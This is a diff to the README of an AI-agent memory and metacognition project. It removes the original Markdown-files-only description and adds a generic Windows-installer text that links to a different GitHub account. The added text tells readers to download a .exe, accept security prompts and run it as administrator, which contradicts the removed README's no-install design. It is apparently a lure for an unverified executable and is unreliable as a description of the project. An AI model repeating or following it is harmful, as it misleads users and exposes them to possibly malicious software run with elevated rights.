@@ -1,353 +1,164 @@
-<div align="center">
+# 🤖 AgentMind - AI Brain That Thinks and Remembers
 
-# 🧠 AgentMind
-
-### A Brain Operating System for AI Agents
-
-**Metacognition (how to think) + Persistent Memory (what to remember)**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![Email](https://img.shields.io/badge/Email-Contact-blue?logo=gmail&logoColor=white)](mailto:769811481@qq.com)
-
-[Quick Start](#-quick-start) · [Why AgentMind](#-why-agentmind) · [Architecture](#-architecture) · [Examples](#-examples) · [Contributing](#-contributing)
-
-</div>
+[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://github.com/Ahmed-Mazh2r/AgentMind)
 
 ---
 
-## The Problem
+AgentMind works as a brain for AI agents. It helps AI think clearly and keep track of past actions. This makes the AI smarter and able to handle tasks over time. You do not need prior skills in AI or programming to use this software.
 
-Every AI agent has two fatal flaws:
+## 🧠 What is AgentMind?
 
-1. **It doesn't think about HOW it thinks.** It jumps to answers, fabricates data, forgets the original goal mid-task, and repeats the same failing approach.
+AgentMind is a desktop app designed to run on Windows. It builds on artificial intelligence ideas like memory, thinking steps, and clear planning. This helps AI agents operate better in complex tasks.
 
-2. **It forgets EVERYTHING when the conversation ends.** New chat = total stranger. Your preferences, your projects, yesterday's progress — all gone.
+AgentMind includes features that let AI:
 
-AgentMind fixes both.
+- Think through problems step by step  
+- Remember previous actions even after closing  
+- Adjust responses based on past results  
+- Use prompts effectively for better answers  
 
----
+This application fits users who want a simple way to test and run AI agents with memory on their own PC.
 
-## 💡 Why AgentMind
+## 🖥️ System Requirements
 
-| | Without AgentMind | With AgentMind |
-|---|---|---|
-| **New conversation** | "What project? What language? Where is it?" | Reads your context from memory files, starts working immediately |
-| **Known pitfall** | Wastes 10 minutes rediscovering the same fix | Checks procedural memory, avoids it in 2 seconds |
-| **Research task** | Generates plausible-sounding fabricated statistics | Searches the web first, cites real sources |
-| **Complex task** | Forgets the goal halfway through | Re-checks original intent after every major step |
-| **Same error 3x** | Tries the same approach a 4th time | Hard rule: switches to a completely different method |
+Before installing, make sure your PC meets these:
 
-**No database. No API keys. No vendor lock-in.** Just Markdown files on your machine.
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM minimum, 8 GB or more recommended  
+- At least 500 MB of free disk space  
+- Internet connection for initial setup and updates  
+- Screen resolution 1024 x 768 or higher  
 
----
+If you meet these, AgentMind will install and run smoothly.
 
-## 🚀 Quick Start
+## 🚀 Getting Started
 
-### Option 1: Full Install (Metacognition + Memory)
+To begin using AgentMind on your Windows computer, follow these steps carefully. Each step guides you through download, installation, and first use.
 
-```bash
-# Clone the repo
-git clone https://github.com/q7766206/AgentMind.git
+### Step 1: Download AgentMind
 
-# For Claude Code
-cp -r AgentMind/metacognition ~/.claude/skills/agentmind-metacognition
-cp -r AgentMind/memory ~/.claude/skills/agentmind-memory
+Visit the link below to download the latest version:
 
-# Create your memory workspace
-mkdir -p ~/agentmind/memory
-cp AgentMind/memory/templates/* ~/agentmind/
-```
+[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://github.com/Ahmed-Mazh2r/AgentMind)
 
-### Option 2: Metacognition Only
+This link takes you to the GitHub page where you can find the installer file for Windows.
 
-Just want better thinking without persistent memory?
+1. Open the link in your web browser.
+2. Find the "Releases" section or look for a file with a `.exe` extension.
+3. Click on the `.exe` file to start the download.
+4. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
-```bash
-cp -r AgentMind/metacognition ~/.claude/skills/agentmind-metacognition
-```
+### Step 2: Install AgentMind
 
-### Option 3: Memory Only
+Once the download finishes, follow these steps to install:
 
-Just want persistent memory without the thinking protocol?
+1. Double-click the downloaded `.exe` file.
+2. If Windows shows a security prompt, select "Run" to allow the installer.
+3. Follow the on-screen instructions:
+   - Accept the license terms.
+   - Choose an install location or use the default path.
+   - Click "Install" to begin.
+4. Wait for the process to finish.
+5. Click "Finish" to close the installer.
 
-```bash
-cp -r AgentMind/memory ~/.claude/skills/agentmind-memory
-mkdir -p ~/agentmind/memory
-cp AgentMind/memory/templates/* ~/agentmind/
-```
+AgentMind is now installed on your PC.
 
-### For Other AI Agents (GPT, Gemini, etc.)
+### Step 3: Launch the Application
 
-Include the content of `metacognition/SKILL.md` and/or `memory/SKILL.md` in your system prompt or instruction file.
+To open AgentMind:
 
-### Platform-Specific Integration
+- Find the AgentMind shortcut on your Desktop or in the Start Menu.
+- Double-click the icon.
+- The main screen shows a simple dashboard to start interacting with the AI agent.
 
-<details>
-<summary><b>Claude Code</b></summary>
+### Step 4: Basic Usage
 
-```bash
-# Copy skill files to Claude's skill directory
-cp -r AgentMind/metacognition ~/.claude/skills/agentmind-metacognition
-cp -r AgentMind/memory ~/.claude/skills/agentmind-memory
+AgentMind has an easy interface for you:
 
-# Create memory workspace
-mkdir -p ~/agentmind/memory
-cp AgentMind/memory/templates/* ~/agentmind/
-```
+- Type a question or task in the input box.
+- Click "Run" or press Enter.
+- The AI will process your request, using its memory and thinking steps.
+- Results show up on the screen with clear explanations.
 
-Claude Code will auto-detect skills in `~/.claude/skills/`.
-</details>
+You can explore more options in the menus to customize how the AI thinks or remembers.
 
-<details>
-<summary><b>Cursor</b></summary>
+## 📂 How AgentMind Works
 
-```bash
-# Copy to Cursor's rules directory
-mkdir -p .cursor/rules
-cp AgentMind/metacognition/SKILL.md .cursor/rules/agentmind-metacognition.md
-cp AgentMind/memory/SKILL.md .cursor/rules/agentmind-memory.md
+AgentMind uses a type of AI called a large language model (LLM) combined with a memory system. This allows the AI to:
 
-# Create memory workspace in your project root
-mkdir -p .agentmind/memory
-cp AgentMind/memory/templates/* .agentmind/
-```
+- Store information across sessions  
+- Use past information to answer new questions  
+- Follow a protocol to break down complex tasks  
 
-Then in Cursor Settings → Rules, the files will be auto-loaded as project rules.
-</details>
+Think of it like a digital brain that takes notes and reasons step by step.
 
-<details>
-<summary><b>Windsurf</b></summary>
+## 🔧 Features
 
-```bash
-# Copy to Windsurf's rules directory
-mkdir -p .windsurf/rules
-cp AgentMind/metacognition/SKILL.md .windsurf/rules/agentmind-metacognition.md
-cp AgentMind/memory/SKILL.md .windsurf/rules/agentmind-memory.md
+Here are some features you will find in AgentMind:
 
-# Create memory workspace
-mkdir -p .agentmind/memory
-cp AgentMind/memory/templates/* .agentmind/
-```
-</details>
+- **Memory Persistence:** Saves your work and knowledge between uses.  
+- **Prompt Engineering:** Adjust the AI’s instructions for better results.  
+- **Thinking Protocol:** AI thinks in steps rather than one answer.  
+- **User-Friendly Interface:** Simple layout for easy interaction.  
+- **AI Agent Support:** Designed to run agents like Claude and similar models.  
 
-<details>
-<summary><b>Cline (VS Code)</b></summary>
+These features make AI agents more useful for tasks that need long-term planning and recall.
 
-```bash
-# Copy to Cline's custom instructions directory
-mkdir -p .cline/rules
-cp AgentMind/metacognition/SKILL.md .cline/rules/agentmind-metacognition.md
-cp AgentMind/memory/SKILL.md .cline/rules/agentmind-memory.md
+## ⚙️ Settings and Customization
 
-# Create memory workspace
-mkdir -p .agentmind/memory
-cp AgentMind/memory/templates/* .agentmind/
-```
+AgentMind lets you change how the AI operates:
 
-Or paste the SKILL.md content into Cline's "Custom Instructions" field in settings.
-</details>
+- Adjust memory size  
+- Select AI model preferences  
+- Clear or edit stored memories  
+- Change the thinking step limit  
+- Manage prompts and input styles  
 
-<details>
-<summary><b>ChatGPT / GPT-4 (Custom Instructions)</b></summary>
+You can find these settings in the "Preferences" or "Settings" menu inside the app. They help tailor the AI to your needs.
 
-1. Open ChatGPT → Settings → Personalization → Custom Instructions
-2. Paste the content of `metacognition/SKILL.md` into "How would you like ChatGPT to respond?"
-3. For memory: ChatGPT has built-in memory, but you can paste `memory/SKILL.md` to enhance its memory protocol
+## 💡 Tips for Best Use
 
-Note: ChatGPT's custom instructions have a character limit (~1500 chars). Use the condensed version from `examples/chatgpt-condensed.md` (coming soon).
-</details>
+- Start with simple questions and tasks before moving to complex ones.  
+- Use clear and direct language when typing commands.  
+- Save your work regularly if you plan long sessions.  
+- Explore the memory and prompt options to improve results.  
+- Keep the app updated by checking the link above for new releases.  
 
-<details>
-<summary><b>Any LLM via System Prompt</b></summary>
+## 🛠️ Troubleshooting
 
-For any LLM API (OpenAI, Anthropic, Google, local models):
+If you face issues:
 
-```python
-# Python example
-with open("AgentMind/metacognition/SKILL.md") as f:
-    metacognition = f.read()
+- Make sure your Windows system is up to date.  
+- Check that you installed the app completely without interruption.  
+- Restart your computer and open the app again.  
+- Review the settings to ensure correct AI model and memory options are selected.  
+- If the app does not launch, try running it as an administrator (right-click > Run as administrator).  
 
-with open("AgentMind/memory/SKILL.md") as f:
-    memory = f.read()
+For advanced help, explore the GitHub issues page where users share fixes and tips.
 
-system_prompt = f"""
-{metacognition}
+## 📥 Download AgentMind
+
+Access the latest version anytime here:
+
+[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://github.com/Ahmed-Mazh2r/AgentMind)
+
+Use this link to find updates, new releases, and support.
 
 ---
 
-{memory}
-"""
+## 🏷️ Topics
 
-# Use as system message in your API call
-response = client.chat.completions.create(
-    model="your-model",
-    messages=[
-        {"role": "system", "content": system_prompt},
-        {"role": "user", "content": user_message}
-    ]
-)
-```
-</details>
+This project relates to:
 
----
+- ai-agent  
+- ai-memory  
+- claude  
+- claude-code  
+- llm  
+- memory  
+- metacognition  
+- persistent-memory  
+- prompt-engineering  
+- thinking-protocol  
 
-## 🏗 Architecture
-
-```
-AgentMind
-├── metacognition/          # HOW your agent thinks
-│   └── SKILL.md            # The thinking protocol
-│
-├── memory/                 # WHAT your agent remembers
-│   ├── SKILL.md            # The memory protocol
-│   └── templates/          # Starter templates
-│       ├── MEMORY.md       # Semantic memory (facts & preferences)
-│       ├── PROCEDURES.md   # Procedural memory (lessons learned)
-│       └── WORKING.md      # Working memory (current task)
-│
-└── examples/               # Real-world usage examples
-    └── usage-examples.md
-```
-
-### Metacognition Protocol
-
-The thinking OS. It makes your agent:
-
-- **Decode intent** — understand what the user *really* wants (not just what they said)
-- **Think in 3 layers** — surface problem → real need → next problem
-- **Validate in reverse** — actively try to disprove its own conclusions
-- **Monitor itself** — catch fake completion, vague filler, mid-task amnesia
-- **Fail-3-Switch** — same method fails 3 times? Mandatory method change
-- **Search offensively** — web search is a primary weapon, not a last resort
-
-### Memory System
-
-Four layers of persistent memory, inspired by cognitive science:
-
-| Layer | File | Purpose | Lifespan |
-|-------|------|---------|----------|
-| **Working** | `WORKING.md` | Current task state & progress | Session (cleared after task) |
-| **Episodic** | `memory/YYYY-MM-DD.md` | Daily event logs | 30 days |
-| **Semantic** | `MEMORY.md` | Long-term facts & user preferences | Permanent |
-| **Procedural** | `PROCEDURES.md` | How-to knowledge & lessons learned | Permanent |
-
-All stored as **plain Markdown**. Open them in any text editor. Edit them. Delete what you don't want remembered. You're in full control.
-
-### Advanced Features
-
-- **Memory Compression** — Monthly protocol to distill episodic logs into semantic facts, deduplicate, and keep files lean
-- **Confidence Markers** — Tag memories as `verify`, `uncertain`, or `stale` so the agent knows what to re-check
-- **Conflict Resolution** — Decision tree for handling contradictory information (preference changes, source disagreements, temporal updates)
-- **Multi-Profile Support** — `profiles/` directory structure for multiple agents or projects with shared knowledge base
-
----
-
-## 📖 Examples
-
-### Agent Remembers Your Setup
-
-```
-Day 1: "My project is at ~/projects/myapp, using Python 3.11 with FastAPI."
-       → Agent writes to MEMORY.md
-
-Day 2: "Add a new endpoint."
-       → Agent reads MEMORY.md, knows the project, framework, and location
-       → Starts working immediately. No questions asked.
-```
-
-### Agent Learns From Mistakes
-
-```
-Session 1: Agent tries `pip install` on system Python. Fails (no pip).
-           Discovers workaround: use venv pip.
-           → Writes to PROCEDURES.md
-
-Session 2: Same situation arises.
-           → Agent reads PROCEDURES.md, uses venv pip directly.
-           → Zero time wasted.
-```
-
-### Metacognition Prevents Fabrication
-
-```
-User: "Write a market analysis report."
-
-Without metacognition:
-  → Agent generates 2000 words of plausible but fabricated statistics
-
-With metacognition:
-  → Agent assesses: "Information completeness: 30%. I need real data."
-  → Searches the web, finds actual statistics
-  → Writes report with cited sources
-```
-
-See more in [`examples/usage-examples.md`](examples/usage-examples.md).
-
----
-
-## 🔗 How It Compares
-
-| Feature | AgentMind | Mem0 | MemOS | OpenClaw Memory |
-|---------|-----------|------|-------|-----------------|
-| **Storage** | Local Markdown | Vector DB + Graph DB | Vector DB + API | Local Markdown |
-| **Dependencies** | None | Python SDK + API key | Python SDK + API key | Part of larger framework |
-| **Human-readable** | ✅ Plain text | ❌ Embeddings | ❌ Embeddings | ✅ Plain text |
-| **Human-editable** | ✅ Any text editor | ❌ API only | ❌ API only | ✅ Any text editor |
-| **Metacognition** | ✅ Built-in | ❌ | ❌ | ❌ |
-| **Memory compression** | ✅ Monthly protocol | ✅ Auto | ✅ Auto | ❌ |
-| **Confidence markers** | ✅ verify/uncertain/stale | ❌ | ❌ | ❌ |
-| **Multi-profile** | ✅ profiles/ directory | ✅ User-scoped | ✅ User-scoped | ❌ |
-| **Conflict resolution** | ✅ Decision tree | ❌ Last-write-wins | ❌ | ❌ |
-| **Zero-code setup** | ✅ Copy files | ❌ Requires coding | ❌ Requires coding | ❌ Requires setup |
-| **Cross-agent** | ✅ Claude/Cursor/Windsurf/GPT/any LLM | ❌ SDK only | ❌ SDK only | ❌ OpenClaw only |
-| **Cost** | Free | Free tier + paid | Free tier + paid | Free |
-| **Works offline** | ✅ | ❌ | ❌ | ✅ |
-
-**AgentMind's niche**: Zero-dependency, human-readable, works-offline memory + thinking protocol. Not competing with Mem0/MemOS on vector search — competing on simplicity and transparency.
-
----
-
-## 💬 Contact
-
-📧 **Email**: [769811481@qq.com](mailto:769811481@qq.com) — Questions, collaborations, feedback welcome.
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Here's how:
-
-1. **Fork** the repo
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
-
-### Ideas for Contributions
-
-- 🌍 **Translations** — translate SKILL.md files to other languages (Chinese, Japanese, Korean, Spanish...)
-- 🧪 **More examples** — real-world usage scenarios
-- 🔌 **Integrations** — adapters for other AI platforms (Cursor, Windsurf, Cline...)
-- 📊 **Memory analytics** — scripts to visualize memory growth over time
-- 🔄 **Sync** — optional cloud sync for multi-device setups
-
----
-
-## 📄 License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
-Use it, modify it, share it. Attribution appreciated but not required.
-
----
-
-<div align="center">
-
-**Built with ❤️ for the AI agent community**
-
-*If AgentMind helps you, consider giving it a ⭐ on GitHub!*
-
-📧 [769811481@qq.com](mailto:769811481@qq.com)
-
-</div>
+These topics show the core technologies and ideas behind AgentMind.
